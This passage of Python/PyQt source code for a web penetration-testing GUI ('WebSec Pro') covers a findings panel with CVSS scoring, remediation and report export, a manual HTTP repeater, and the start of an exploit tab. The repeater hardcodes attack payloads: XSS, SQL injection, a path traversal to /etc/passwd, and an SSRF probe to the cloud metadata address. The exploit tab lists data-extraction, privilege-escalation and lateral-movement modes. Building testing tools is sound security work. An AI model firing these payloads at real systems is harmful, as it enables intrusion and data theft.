    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(6, 6, 6, 6)
        layout.setSpacing(6)

        # ── Top: summary bar + export buttons ────────────────────────────────
        top_row = QHBoxLayout()
        self.summary_bar = QLabel("No vulnerabilities found yet. Run a scan first.")
        self.summary_bar.setStyleSheet("color:#4a7a9a; padding:4px 0;")
        top_row.addWidget(self.summary_bar, 1)
        btn_json = QPushButton("⬇ Export JSON")
        btn_json.setFixedHeight(26)
        btn_json.clicked.connect(self._export_json)
        btn_html = QPushButton("⬇ Export HTML Report")
        btn_html.setFixedHeight(26)
        btn_html.clicked.connect(self._export_html)
        top_row.addWidget(btn_json)
        top_row.addWidget(btn_html)
        layout.addLayout(top_row)

        # ── Main splitter: table on top, rich detail panel below ─────────────
        splitter = QSplitter(Qt.Vertical)

        # Vuln table
        vt_widget = QWidget()
        vtl = QVBoxLayout(vt_widget)
        vtl.setContentsMargins(0, 0, 0, 0)
        sec_lbl = QLabel("VULNERABILITIES  —  click row for details  |  right-click to exploit or export")
        sec_lbl.setObjectName("sectionLabel")
        vtl.addWidget(sec_lbl)
        self.vuln_table = VulnTable()
        self.vuln_table.sig_send_to_exploit.connect(self.sig_send_to_exploit)
        self.vuln_table.sig_selected.connect(self._on_select)
        vtl.addWidget(self.vuln_table)
        splitter.addWidget(vt_widget)

        # ── Rich detail panel ─────────────────────────────────────────────────
        detail_widget = QWidget()
        dl = QVBoxLayout(detail_widget)
        dl.setContentsMargins(0, 4, 0, 0)
        dl.setSpacing(4)

        detail_tabs = QTabWidget()
        detail_tabs.setTabPosition(QTabWidget.South)

        # Tab 1: Summary + CVSS
        self.tab_summary = QTextBrowser()
        self.tab_summary.setOpenExternalLinks(True)
        detail_tabs.addTab(self.tab_summary, "📋  Summary & CVSS")

        # Tab 2: Remediation
        self.tab_remediation = QTextBrowser()
        self.tab_remediation.setOpenExternalLinks(True)
        detail_tabs.addTab(self.tab_remediation, "🛡  Remediation")

        # Tab 3: Evidence (request/response proof)
        evidence_widget = QWidget()
        ev_layout = QVBoxLayout(evidence_widget)
        ev_layout.setContentsMargins(0, 0, 0, 0)
        ev_layout.setSpacing(2)
        ev_split = QSplitter(Qt.Horizontal)
        self.ev_request  = QTextEdit(); self.ev_request.setReadOnly(True)
        HttpHighlighter(self.ev_request.document())
        self.ev_response = QTextEdit(); self.ev_response.setReadOnly(True)
        HttpHighlighter(self.ev_response.document())
        ev_lbl_l = QLabel("PROOF REQUEST"); ev_lbl_l.setObjectName("sectionLabel")
        ev_lbl_r = QLabel("PROOF RESPONSE"); ev_lbl_r.setObjectName("sectionLabel")
        lw = QWidget(); ll = QVBoxLayout(lw); ll.setContentsMargins(0,0,0,0)
        ll.addWidget(ev_lbl_l); ll.addWidget(self.ev_request)
        rw = QWidget(); rl = QVBoxLayout(rw); rl.setContentsMargins(0,0,0,0)
        rl.addWidget(ev_lbl_r); rl.addWidget(self.ev_response)
        ev_split.addWidget(lw); ev_split.addWidget(rw)
        ev_layout.addWidget(ev_split)
        detail_tabs.addTab(evidence_widget, "🔬  HTTP Evidence")

        # Tab 4: Raw JSON
        self.tab_raw = QTextEdit(); self.tab_raw.setReadOnly(True)
        detail_tabs.addTab(self.tab_raw, "{ } Raw JSON")

        dl.addWidget(detail_tabs)

        btn_row = QHBoxLayout()
        self.btn_exploit = QPushButton("⚡  SEND TO EXPLOIT TAB")
        self.btn_exploit.setObjectName("btnDanger")
        self.btn_exploit.setEnabled(False)
        self.btn_exploit.clicked.connect(self._exploit_selected)
        self.btn_copy_curl = QPushButton("📋  Copy cURL")
        self.btn_copy_curl.setEnabled(False)
        self.btn_copy_curl.clicked.connect(self._copy_curl)
        self.btn_copy_report = QPushButton("📋  Copy Finding")
        self.btn_copy_report.setEnabled(False)
        self.btn_copy_report.clicked.connect(self._copy_finding)
        btn_row.addWidget(self.btn_exploit)
        btn_row.addWidget(self.btn_copy_curl)
        btn_row.addWidget(self.btn_copy_report)
        btn_row.addStretch()
        dl.addLayout(btn_row)

        splitter.addWidget(detail_widget)
        splitter.setSizes([280, 320])
        layout.addWidget(splitter)

    # ── data ──────────────────────────────────────────────────────────────────

    def add_vuln(self, vuln: VulnEntry):
        self._vulns.append(vuln)
        self.vuln_table.add_vuln(vuln)
        self._refresh_summary_bar()

    def _refresh_summary_bar(self):
        counts = {}
        for v in self._vulns:
            counts[v.severity] = counts.get(v.severity, 0) + 1
        parts = [f'<span style="color:{SEVERITY.get(s,"#ccc")}">{s}: {n}</span>'
                 for s, n in sorted(counts.items())]
        self.summary_bar.setText(
            f'Total: <b style="color:#00d4ff">{len(self._vulns)}</b>  —  ' + "  ".join(parts)
        )

    # ── detail rendering ──────────────────────────────────────────────────────

    @pyqtSlot(object)
    def _on_select(self, vuln: VulnEntry):
        self._render_summary(vuln)
        self._render_remediation(vuln)
        self._render_evidence(vuln)
        self._render_raw(vuln)
        self.btn_exploit.setEnabled(True)
        self.btn_copy_curl.setEnabled(True)
        self.btn_copy_report.setEnabled(True)

    def _render_summary(self, v: VulnEntry):
        sev_color = SEVERITY.get(v.severity, "#cccccc")
        score     = v.cvss_score
        score_color = ("#ff3030" if score >= 9.0 else "#ff8040" if score >= 7.0
                       else "#ffcc40" if score >= 4.0 else "#40cc80")
        # CVSS vector breakdown
        av_l  = CVSS_LABELS["AV"].get(v.cvss_av,  v.cvss_av)
        ac_l  = CVSS_LABELS["AC"].get(v.cvss_ac,  v.cvss_ac)
        pr_l  = CVSS_LABELS["PR"].get(v.cvss_pr,  v.cvss_pr)
        ui_l  = CVSS_LABELS["UI"].get(v.cvss_ui,  v.cvss_ui)
        s_l   = CVSS_LABELS["S"].get(v.cvss_s,    v.cvss_s)
        c_l   = CVSS_LABELS["C"].get(v.cvss_c,    v.cvss_c)
        i_l   = CVSS_LABELS["I"].get(v.cvss_i,    v.cvss_i)
        a_l   = CVSS_LABELS["A"].get(v.cvss_a,    v.cvss_a)

        def metric(label, val, is_risk=False):
            c = "#ff6060" if is_risk and val in ("High","Network","Changed","None") else "#a0c8e0"
            return f'<tr><td style="color:#668899;padding:2px 8px">{label}</td><td style="color:{c};padding:2px 8px"><b>{val}</b></td></tr>'

        confirmed_badge = ('<span style="color:#40ee80">✓ CONFIRMED</span>' if v.confirmed
                          else '<span style="color:#888888">○ Unconfirmed</span>')

        html = f"""
<div style="font-family:Consolas,monospace;font-size:12px;padding:8px;background:#0a0e1a;color:#c8d8e8">
  <h2 style="color:{sev_color};margin:0 0 6px 0">{v.vuln_type}</h2>
  <table style="width:100%;border-collapse:collapse;margin-bottom:10px">
    <tr><td style="color:#668899;padding:2px 8px">Severity</td>
        <td style="padding:2px 8px"><b style="color:{sev_color}">{v.severity}</b> &nbsp; {confirmed_badge}</td></tr>
    <tr><td style="color:#668899;padding:2px 8px">URL</td>
        <td style="padding:2px 8px;color:#80d0ff">{v.url}</td></tr>
    <tr><td style="color:#668899;padding:2px 8px">Parameter</td>
        <td style="padding:2px 8px;color:#88aacc">{v.parameter or "—"}</td></tr>
    <tr><td style="color:#668899;padding:2px 8px">Payload</td>
        <td style="padding:2px 8px;color:#ff9060;font-size:11px">{v.payload or "—"}</td></tr>
    <tr><td style="color:#668899;padding:2px 8px">Detected</td>
        <td style="padding:2px 8px;color:#888888">{v.timestamp.strftime("%Y-%m-%d %H:%M:%S")}</td></tr>
  </table>

  <p style="color:#c8d8e8;border-left:3px solid {sev_color};padding-left:10px;margin:8px 0">{v.description}</p>

  <h3 style="color:#00d4ff;margin:12px 0 4px 0">CVSS v3.1 Score</h3>
  <div style="font-size:28px;font-weight:bold;color:{score_color};margin:4px 0 2px 0">{score:.1f}
    <span style="font-size:13px;color:#888888"> / 10.0</span>
    <span style="font-size:13px;color:{score_color};margin-left:10px">
      {"CRITICAL" if score>=9 else "HIGH" if score>=7 else "MEDIUM" if score>=4 else "LOW"}
    </span>
  </div>
  <div style="color:#668899;font-size:10px;margin-bottom:8px">Vector: {v.cvss_vector}</div>

  <table style="border-collapse:collapse;margin-bottom:10px">
    <tr><td colspan="2" style="color:#4a7a9a;padding:2px 8px;border-bottom:1px solid #1e3a5f">
      <b>EXPLOITABILITY</b></td></tr>
    {metric("Attack Vector",    av_l,  av_l=="Network")}
    {metric("Attack Complexity",ac_l,  ac_l=="Low")}
    {metric("Privileges Required",pr_l, pr_l=="None")}
    {metric("User Interaction", ui_l,  ui_l=="None")}
    <tr><td colspan="2" style="color:#4a7a9a;padding:6px 8px 2px;border-bottom:1px solid #1e3a5f">
      <b>IMPACT</b></td></tr>
    {metric("Scope",             s_l,  s_l=="Changed")}
    {metric("Confidentiality",   c_l,  c_l=="High")}
    {metric("Integrity",         i_l,  i_l=="High")}
    {metric("Availability",      a_l,  a_l=="High")}
  </table>
</div>"""
        self.tab_summary.setHtml(html)

    def _render_remediation(self, v: VulnEntry):
        rem = v.remediation
        steps_html = "".join(
            f'<li style="padding:3px 0;color:#c8d8e8">{s}</li>'
            for s in rem.get("steps", [])
        )
        refs_html = "".join(
            f'<li><a href="{r}" style="color:#00aaff">{r}</a></li>'
            if r.startswith("http") else
            f'<li style="color:#88aacc">{r}</li>'
            for r in rem.get("references", [])
        )
        html = f"""
<div style="font-family:Consolas,monospace;font-size:12px;padding:8px;background:#0a0e1a;color:#c8d8e8">
  <h3 style="color:#40ee80;margin:0 0 8px 0">🛡 Remediation: {v.vuln_type}</h3>
  <p style="border-left:3px solid #40ee80;padding-left:10px;color:#a0d8a0;margin-bottom:12px">
    {rem.get('summary','Apply secure coding best practices.')}
  </p>
  <h4 style="color:#00d4ff;margin:0 0 4px 0">Remediation Steps</h4>
  <ol style="margin:0 0 12px 0;padding-left:20px">{steps_html}</ol>
  <h4 style="color:#00d4ff;margin:0 0 4px 0">References</h4>
  <ul style="margin:0;padding-left:20px">{refs_html}</ul>
</div>"""
        self.tab_remediation.setHtml(html)

    def _render_evidence(self, v: VulnEntry):
        if v.http_entry:
            self.ev_request.setPlainText(v.http_entry.format_request())
            resp_text = v.http_entry.format_response()
            # Highlight evidence in response
            if v.evidence and len(v.evidence) > 10:
                snip = v.evidence[:80].replace("\n", " ")
                resp_text += f"\n\n── EVIDENCE MATCH ──\n{snip}"
            self.ev_response.setPlainText(resp_text)
        else:
            self.ev_request.setPlainText("(No HTTP capture for this finding)")
            self.ev_response.setPlainText(
                f"Evidence:\n\n{v.evidence}\n\n"
                f"Payload used:\n{v.payload or '(none)'}"
            )

    def _render_raw(self, v: VulnEntry):
        data = {
            "vuln_type": v.vuln_type, "severity": v.severity,
            "cvss_score": v.cvss_score, "cvss_vector": v.cvss_vector,
            "url": v.url, "parameter": v.parameter,
            "description": v.description, "payload": v.payload,
            "evidence": v.evidence, "confirmed": v.confirmed,
            "timestamp": v.timestamp.isoformat(),
            "remediation_summary": v.remediation.get("summary",""),
            "http_evidence": {
                "request":  v.http_entry.format_request()  if v.http_entry else None,
                "response": v.http_entry.format_response()[:4000] if v.http_entry else None,
            }
        }
        self.tab_raw.setPlainText(json.dumps(data, indent=2))

    # ── actions ───────────────────────────────────────────────────────────────

    def _exploit_selected(self):
        vuln = self.vuln_table.selected_vuln()
        if vuln:
            self.sig_send_to_exploit.emit(vuln)

    def _copy_curl(self):
        vuln = self.vuln_table.selected_vuln()
        if not vuln:
            return
        param_str = (f"?{urllib.parse.quote(vuln.parameter)}="
                     f"{urllib.parse.quote(vuln.payload)}"
                     if vuln.parameter and vuln.payload else "")
        curl = f"curl -sk '{vuln.url}{param_str}'"
        QApplication.clipboard().setText(curl)

    def _copy_finding(self):
        vuln = self.vuln_table.selected_vuln()
        if not vuln:
            return
        rem = vuln.remediation
        txt = (
            f"{'='*60}\n"
            f"FINDING: {vuln.vuln_type}\n"
            f"{'='*60}\n"
            f"Severity  : {vuln.severity}\n"
            f"CVSS      : {vuln.cvss_score:.1f} ({vuln.cvss_vector})\n"
            f"URL       : {vuln.url}\n"
            f"Parameter : {vuln.parameter}\n"
            f"Payload   : {vuln.payload or '(none)'}\n"
            f"Confirmed : {vuln.confirmed}\n"
            f"Detected  : {vuln.timestamp.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"DESCRIPTION:\n{vuln.description}\n\n"
            f"EVIDENCE:\n{vuln.evidence}\n\n"
            f"REMEDIATION:\n{rem.get('summary','')}\n"
            + "\n".join(f"  {i+1}. {s}" for i,s in enumerate(rem.get('steps',[])))
            + f"\n\nREFERENCES:\n" + "\n".join(f"  - {r}" for r in rem.get('references',[]))
        )
        QApplication.clipboard().setText(txt)

    # ── exports ───────────────────────────────────────────────────────────────

    def _export_json(self):
        if not self._vulns:
            QMessageBox.information(self, "Export", "No vulnerabilities to export.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export JSON Report",
                                               "websecpro_findings.json", "JSON (*.json)")
        if not path:
            return
        data = {
            "generated": datetime.now().isoformat(),
            "total": len(self._vulns),
            "summary": {s: sum(1 for v in self._vulns if v.severity == s)
                        for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]},
            "findings": [
                {
                    "id": i+1,
                    "vuln_type": v.vuln_type,
                    "severity": v.severity,
                    "cvss_score": v.cvss_score,
                    "cvss_vector": v.cvss_vector,
                    "url": v.url,
                    "parameter": v.parameter,
                    "description": v.description,
                    "payload": v.payload,
                    "evidence": v.evidence,
                    "confirmed": v.confirmed,
                    "timestamp": v.timestamp.isoformat(),
                    "remediation": v.remediation,
                    "http_evidence": {
                        "request":  v.http_entry.format_request()  if v.http_entry else None,
                        "response": v.http_entry.format_response()[:8000] if v.http_entry else None,
                    }
                }
                for i, v in enumerate(self._vulns)
            ]
        }
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        QMessageBox.information(self, "Export", f"Exported {len(self._vulns)} findings → {path}")

    def _export_html(self):
        if not self._vulns:
            QMessageBox.information(self, "Export", "No vulnerabilities to export.")
            return
        path, _ = QFileDialog.getSaveFileName(self, "Export HTML Report",
                                               "websecpro_report.html", "HTML (*.html)")
        if not path:
            return

        sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        sorted_vulns = sorted(self._vulns, key=lambda v: sev_order.get(v.severity, 5))
        counts = {s: sum(1 for v in self._vulns if v.severity == s)
                  for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]}

        def sev_badge(sev):
            colors = {"CRITICAL":"#cc1111","HIGH":"#cc5500","MEDIUM":"#cc9900","LOW":"#336699","INFO":"#228822"}
            c = colors.get(sev, "#555")
            return f'<span style="background:{c};color:#fff;padding:2px 8px;border-radius:3px;font-size:11px">{sev}</span>'

        def score_color(s):
            return ("#cc1111" if s>=9 else "#cc5500" if s>=7 else "#cc9900" if s>=4 else "#228822")

        findings_html = ""
        for i, v in enumerate(sorted_vulns):
            rem   = v.remediation
            steps = "".join(f"<li>{s}</li>" for s in rem.get("steps", []))
            refs  = "".join(
                f'<li><a href="{r}">{r}</a></li>' if r.startswith("http") else f"<li>{r}</li>"
                for r in rem.get("references", [])
            )
            ev_req  = (v.http_entry.format_request()[:3000] if v.http_entry else "(no capture)")
            ev_resp = (v.http_entry.format_response()[:3000] if v.http_entry else v.evidence)
            findings_html += f"""
<div class="finding">
  <div class="finding-header">
    <span class="finding-num">#{i+1}</span>
    {sev_badge(v.severity)}
    <span style="color:#d0a870;font-weight:bold;margin-left:8px">{v.vuln_type}</span>
    <span style="float:right;color:{score_color(v.cvss_score)};font-weight:bold;font-size:18px">
      CVSS {v.cvss_score:.1f}
    </span>
  </div>
  <table class="meta">
    <tr><th>URL</th><td><code>{v.url}</code></td></tr>
    <tr><th>Parameter</th><td><code>{v.parameter or "—"}</code></td></tr>
    <tr><th>Payload</th><td><code>{v.payload or "—"}</code></td></tr>
    <tr><th>CVSS Vector</th><td><code>{v.cvss_vector}</code></td></tr>
    <tr><th>Confirmed</th><td>{"✓ Yes" if v.confirmed else "○ No"}</td></tr>
    <tr><th>Detected</th><td>{v.timestamp.strftime("%Y-%m-%d %H:%M:%S")}</td></tr>
  </table>
  <p class="desc">{v.description}</p>
  <h4>Remediation</h4>
  <p class="rem-summary">{rem.get("summary","")}</p>
  <ol class="steps">{steps}</ol>
  <p><b>References:</b> <ul class="refs">{refs}</ul></p>
  <details>
    <summary>HTTP Evidence</summary>
    <div class="http-split">
      <div><b>Request</b><pre>{v.payload and ev_req.replace('<','&lt;') or ev_req}</pre></div>
      <div><b>Response</b><pre>{ev_resp.replace('<','&lt;')}</pre></div>
    </div>
  </details>
</div>"""

        summary_rows = "".join(
            f'<tr><td>{s}</td><td style="color:{SEVERITY.get(s,"#ccc")}">{counts.get(s,0)}</td></tr>'
            for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]
        )

        html = f"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<title>WebSec Pro — Penetration Test Report</title>
<style>
  body{{font-family:Consolas,'Courier New',monospace;background:#0d1117;color:#c9d1d9;margin:0;padding:24px}}
  h1{{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:8px}}
  h2{{color:#79c0ff;margin-top:24px}}
  h4{{color:#58a6ff;margin:12px 0 4px}}
  a{{color:#58a6ff}}
  .meta{{border-collapse:collapse;width:100%;margin:8px 0}}
  .meta th{{color:#8b949e;text-align:left;padding:3px 12px 3px 0;white-space:nowrap;font-weight:normal}}
  .meta td{{color:#c9d1d9;padding:3px 0}}
  .finding{{background:#161b22;border:1px solid #30363d;border-radius:6px;
            padding:16px;margin-bottom:20px;page-break-inside:avoid}}
  .finding-header{{margin-bottom:10px;font-size:15px;line-height:1.4}}
  .finding-num{{color:#8b949e;margin-right:8px;font-size:12px}}
  .desc{{border-left:3px solid #444;padding-left:12px;color:#8b949e;margin:10px 0}}
  .rem-summary{{border-left:3px solid #238636;padding-left:10px;color:#a0d8a0;margin:6px 0}}
  .steps{{color:#c9d1d9;padding-left:20px;margin:4px 0 12px}}
  .steps li{{padding:3px 0}}
  .refs{{color:#8b949e;padding-left:20px}}
  pre{{background:#0d1117;border:1px solid #30363d;border-radius:4px;
       padding:10px;font-size:11px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;color:#a0c880}}
  .http-split{{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:8px}}
  details summary{{cursor:pointer;color:#58a6ff;margin:8px 0}}
  .summary-table{{border-collapse:collapse;margin:12px 0}}
  .summary-table td{{padding:4px 16px 4px 0}}
  .generated{{color:#8b949e;font-size:11px;margin-bottom:24px}}
</style>
</head><body>
<h1>🔐 WebSec Pro — Penetration Test Report</h1>
<p class="generated">Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} | Total findings: {len(self._vulns)}</p>
<h2>Executive Summary</h2>
<table class="summary-table">
  <tr><th>Severity</th><th>Count</th></tr>
  {summary_rows}
  <tr style="border-top:1px solid #30363d"><td><b>Total</b></td><td><b>{len(self._vulns)}</b></td></tr>
</table>
<h2>Findings</h2>
{findings_html}
<hr style="border-color:#30363d;margin-top:32px">
<p style="color:#8b949e;font-size:11px">
  Report generated by WebSec Pro. For authorised security testing only.
</p>
</body></html>"""

        with open(path, "w", encoding="utf-8") as f:
            f.write(html)
        QMessageBox.information(self, "Export", f"HTML report saved → {path}")


# ─── REPEATER REQUEST WORKER (QThread so Qt signals are safe) ────────────────
class RepeaterWorker(QThread):
    """Fires one HTTP request from the Repeater tab in a background QThread."""
    sig_done  = pyqtSignal(int, str, str, str, int)  # status, reason, raw, ct, elapsed
    sig_error = pyqtSignal(str)

    def __init__(self, method, url, headers, body, timeout=15):
        super().__init__()
        self.method  = method
        self.url     = url
        self.headers = headers   # dict
        self.body    = body      # str
        self.timeout = timeout

    def run(self):
        if not HAS_REQUESTS:
            self.sig_error.emit("'requests' library not installed.")
            return
        try:
            import requests as req
            req.packages.urllib3.disable_warnings()
        except Exception:
            pass
        try:
            t0 = time.time()
            resp = requests.request(
                self.method, self.url,
                headers=self.headers,
                data=self.body.encode() if self.body else None,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            elapsed = int((time.time() - t0) * 1000)
            raw = f"HTTP/1.1 {resp.status_code} {resp.reason}\n"
            for k, v in resp.headers.items():
                raw += f"{k}: {v}\n"
            raw += "\n" + resp.text[:50000]
            ct = resp.headers.get("Content-Type", "")
            self.sig_done.emit(resp.status_code, resp.reason, raw, ct, elapsed)
        except Exception as exc:
            self.sig_error.emit(str(exc))


# ─── MANUAL REPEATER TAB ─────────────────────────────────────────────────────
class RepeaterTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._worker = None
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(8)

        # URL bar
        url_row = QHBoxLayout()
        self.method_combo = QComboBox()
        self.method_combo.addItems(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"])
        self.url_bar = QLineEdit()
        self.url_bar.setPlaceholderText("https://example.com/api/endpoint")
        self.btn_send = QPushButton("▶  SEND")
        self.btn_send.setObjectName("btnSuccess")
        self.btn_send.clicked.connect(self._send_request)
        url_row.addWidget(self.method_combo)
        url_row.addWidget(self.url_bar, 1)
        url_row.addWidget(self.btn_send)
        layout.addLayout(url_row)

        splitter = QSplitter(Qt.Horizontal)

        # Request editor
        req_widget = QWidget()
        rl = QVBoxLayout(req_widget)
        rl.setContentsMargins(0, 0, 0, 0)
        rl.setSpacing(4)
        req_lbl = QLabel("◀  REQUEST  (edit & send)")
        req_lbl.setObjectName("sectionLabel")
        rl.addWidget(req_lbl)
        self.req_editor = QTextEdit()
        self.req_editor.setPlaceholderText(
            "GET /path HTTP/1.1\nHost: example.com\nUser-Agent: WebSecPro/1.0\n\n"
        )
        HttpHighlighter(self.req_editor.document())
        rl.addWidget(self.req_editor)

        # Quick payload buttons
        payload_row = QHBoxLayout()
        payload_row.addWidget(QLabel("PAYLOADS:"))
        payloads = [
            ("XSS Basic", "<script>alert(1)</script>"),
            ("SQLi Error", "' OR '1'='1"),
            ("SQLi UNION", "' UNION SELECT NULL,NULL--"),
            ("Path Trav.", "../../../etc/passwd"),
            ("SSRF AWS", "http://169.254.169.254/"),
        ]
        for name, payload in payloads:
            btn = QPushButton(name)
            btn.setFixedHeight(26)
            btn.clicked.connect(lambda checked, p=payload: self._insert_payload(p))
            payload_row.addWidget(btn)
        payload_row.addStretch()
        rl.addLayout(payload_row)
        splitter.addWidget(req_widget)

        # Response panel
        resp_widget = QWidget()
        rpl = QVBoxLayout(resp_widget)
        rpl.setContentsMargins(0, 0, 0, 0)
        rpl.setSpacing(4)
        resp_lbl = QLabel("▶  RESPONSE")
        resp_lbl.setObjectName("sectionLabel")
        rpl.addWidget(resp_lbl)

        self.resp_tabs = QTabWidget()
        self.resp_raw = QTextEdit()
        self.resp_raw.setReadOnly(True)
        HttpHighlighter(self.resp_raw.document())
        self.resp_render = QWebEngineView()
        self.resp_tabs.addTab(self.resp_raw, "RAW")
        self.resp_tabs.addTab(self.resp_render, "RENDER")
        rpl.addWidget(self.resp_tabs)

        self.resp_status_bar = QLabel("Ready — press SEND to fire request")
        self.resp_status_bar.setStyleSheet("color:#4a7a9a; font-size: 11px;")
        rpl.addWidget(self.resp_status_bar)
        splitter.addWidget(resp_widget)
        splitter.setSizes([1, 1])
        layout.addWidget(splitter)

    def load_entry(self, entry: HttpEntry):
        self.method_combo.setCurrentText(entry.method)
        self.url_bar.setText(entry.url)
        self.req_editor.setPlainText(entry.format_request())
        self.resp_raw.setPlainText(entry.format_response())
        self.resp_status_bar.setText(
            f"Loaded from traffic — Status {entry.status} — {entry.response_time}ms"
        )

    def _insert_payload(self, payload):
        cursor = self.req_editor.textCursor()
        cursor.insertText(payload)

    def _send_request(self):
        url = self.url_bar.text().strip()
        method = self.method_combo.currentText()
        if not url:
            return

        # Parse headers from the request editor (everything before blank line)
        raw_text = self.req_editor.toPlainText()
        lines = raw_text.splitlines()
        headers = {}
        body_lines = []
        in_body = False
        for i, line in enumerate(lines):
            if i == 0:
                continue  # skip request line — we use url_bar + method_combo
            if line.strip() == "" and not in_body:
                in_body = True
                continue
            if in_body:
                body_lines.append(line)
            else:
                if ":" in line:
                    k, _, v = line.partition(":")
                    headers[k.strip()] = v.strip()
        body = "\n".join(body_lines)

        if not headers.get("User-Agent"):
            headers["User-Agent"] = "WebSecPro/2.0 Manual Repeater"

        self.btn_send.setEnabled(False)
        self.resp_status_bar.setText(f"⏳ Sending {method} {url} ...")

        self._worker = RepeaterWorker(method, url, headers, body)
        self._worker.sig_done.connect(self._on_response, Qt.QueuedConnection)
        self._worker.sig_error.connect(self._on_error, Qt.QueuedConnection)
        self._worker.finished.connect(lambda: self.btn_send.setEnabled(True))
        self._worker.start()

    @pyqtSlot(int, str, str, str, int)
    def _on_response(self, status, reason, raw, ct, elapsed):
        self.resp_raw.setPlainText(raw)
        if "html" in ct:
            body_start = raw.find("\n\n")
            html_body = raw[body_start + 2:] if body_start != -1 else ""
            self.resp_render.setHtml(html_body)
        elif "json" in ct:
            body_start = raw.find("\n\n")
            try:
                pretty = json.dumps(json.loads(raw[body_start + 2:]), indent=2)
            except Exception:
                pretty = raw[body_start + 2:] if body_start != -1 else raw
            self.resp_render.setHtml(
                f"<pre style='background:#080c18;color:#a0c880;"
                f"font-family:monospace;padding:10px'>{pretty}</pre>"
            )
        self.resp_status_bar.setText(
            f"← {status} {reason}  |  {elapsed} ms  |  {len(raw):,} bytes"
        )

    @pyqtSlot(str)
    def _on_error(self, msg):
        self.resp_raw.setPlainText(f"Request failed:\n{msg}")
        self.resp_status_bar.setText(f"Error: {msg}")


# ─── EXPLOITATION TAB ────────────────────────────────────────────────────────
class ExploitTab(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.worker = None
        self.current_vuln = None
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(8, 8, 8, 8)
        layout.setSpacing(8)

        # Vuln info header
        self.vuln_header = QLabel("No vulnerability loaded — send one from the Vulnerabilities tab")
        self.vuln_header.setStyleSheet("color:#ffaa30; font-weight:bold; padding: 4px 0;")
        self.vuln_header.setMaximumHeight(80)
        layout.addWidget(self.vuln_header)

        # Config row
        cfg_row = QHBoxLayout()
        cfg_row.addWidget(QLabel("Exploit Mode:"))
        self.mode_combo = QComboBox()
        self.mode_combo.addItems([
            "Auto Exploit", "Payload Fuzzing", "Data Extraction",
            "Privilege Escalation", "Lateral Movement", "Custom"
        ])
        cfg_row.addWidget(self.mode_combo)
        cfg_row.addWidget(QLabel("Delay (ms):"))
        self.delay_spin = QSpinBox()
        self.delay_spin.setRange(0, 5000)
        self.delay_spin.setValue(200)
        cfg_row.addWidget(self.delay_spin)
        self.cb_verbose = QCheckBox("Verbose")
        self.cb_verbose.setChecked(True)
        cfg_row.addWidget(self.cb_verbose)
        cfg_row.addStretch()
        self.btn_run = QPushButton("⚡  RUN EXPLOIT")
        self.btn_run.setObjectName("btnDanger")
        self.btn_run.setEnabled(False)
        self.btn_run.clicked.connect(self.run_exploit)
        self.btn_stop_ex = QPushButton("■  STOP")
        self.btn_stop_ex.setEnabled(False)
        self.btn_stop_ex.clicked.connect(self.stop_exploit)
        cfg_row.addWidget(self.btn_run)
        cfg_row.addWidget(self.btn_stop_ex)
        layout.addLayout(cfg_row)

        main_split = QSplitter(Qt.Horizontal)

        # Left: loaded vulns list
        left_widget = QWidget()
        ll = QVBoxLayout(left_widget)
        ll.setContentsMargins(0, 0, 0, 0)
        ll.setSpacing(4)
        ll.addWidget(QLabel("LOADED TARGETS"))
        self.vuln_list = QListWidget()
        self.vuln_list.itemClicked.connect(self._on_vuln_selected)
        ll.addWidget(self.vuln_list)
        left_widget.setMaximumWidth(260)
        main_split.addWidget(left_widget)

        # Right: output console
        right_widget = QWidget()
        rl = QVBoxLayout(right_widget)
        rl.setContentsMargins(0, 0, 0, 0)
        rl.setSpacing(4)
        rl.addWidget(QLabel("EXPLOIT CONSOLE"))
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setStyleSheet(
            "QTextEdit { background-color: #03060f; color: #00ff88; "
            "font-family: 'Consolas','Courier New',monospace; font-size: 12px; }"
        )
        rl.addWidget(self.console)

        # Progress
        self.ex_progress = QProgressBar()
        self.ex_progress.setTextVisible(False)
        rl.addWidget(self.ex_progress)
        main_split.addWidget(right_widget)
        main_split.setSizes([250, 800])
        layout.addWidget(main_split)

        self.vulns = []

    def load_vuln(self, vuln: VulnEntry):
        self.vulns.append(vuln)
        item = QListWidgetItem()
        color = SEVERITY.get(vuln.severity, "#cccccc")
        item.setText(f"[{vuln.severity}] {vuln.vuln_type}")
        item.setForeground(QColor(color))
        item.setData(Qt.UserRole, len(self.vulns) - 1)
        self.vuln_list.addItem(item)
        self.vuln_list.setCurrentItem(item)
        self._load_vuln_at(len(self.vulns) - 1)

    def _on_vuln_selected(self, item):
        idx = item.data(Qt.UserRole)
        self._load_vuln_at(idx)

    def _load_vuln_at(self, idx):
        if 0 <= idx < len(self.vulns):
            self.current_vuln = self.vulns[idx]
            v = self.current_vuln
            color = SEVERITY.get(v.severity, "#cccccc")
            self.vuln_header.setText(
                f'<span style="color:{color}">[{v.severity}]</span>  {v.vuln_type}  '
                f'<span style="color:#7ab8d4">{v.url}</span>  '
                f'<span style="color:#888888">param: {v.parameter}</span>'
            )
            self.btn_run.setEnabled(True)
            self.console.clear()
            self._write("Vulnerability loaded. Press RUN EXPLOIT to begin.", "info")

    def run_exploit(self):
        if not self.current_vuln:
            return
        self.console.clear()
        self.ex_progress.setValue(0)
        self.btn_run.setEnabled(False)
        self.btn_stop_ex.setEnabled(True)

